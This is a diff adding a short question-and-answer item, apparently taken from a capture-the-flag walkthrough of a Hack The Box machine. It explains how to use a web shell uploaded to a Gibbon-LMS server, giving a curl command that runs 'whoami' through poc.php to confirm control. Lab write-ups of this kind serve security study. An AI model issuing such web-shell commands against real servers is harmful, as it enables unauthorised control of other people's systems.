@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What should you do after successfully uploading a web shell?
+
+CONTEXT:
+The web shell is now accessible.
+
+METHOD / ANSWER:
+Command: `curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=whoami`
+Explanation: This command executes a command via the web shell, confirming control over the server.
